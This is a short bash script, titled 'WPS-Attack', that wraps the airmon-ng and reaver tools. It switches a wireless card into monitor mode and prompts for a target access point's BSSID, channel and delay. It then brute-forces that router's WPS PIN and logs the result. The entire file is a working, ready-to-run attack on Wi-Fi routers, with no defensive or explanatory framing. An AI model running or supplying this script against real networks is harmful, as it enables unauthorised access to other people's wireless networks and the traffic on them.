#! /bin/bash
# WPS-Attack

echo Starting WPS Attack...
airmon-ng stop wlan0
airmon-ng check kill
airmon-ng start wlan0
airmon-ng check kill wlan0mon
echo Enter target WiFi AP:
read -p 'WiFi AP: ' bssidvar
echo Enter Channel
read -p 'Channel: ' chanvar
echo How long to delay in seconds before each attempt
read -p 'Delay: ' delvar
echo Enter filename
read -p 'Filename: ' filevar
reaver -i wlan0mon -b $bssidvar -vv -S -P -c $chanvar -d $delvar -o /root/wpslog/wpscrack/$filevar.log 
echo Now stopping WPS attack...
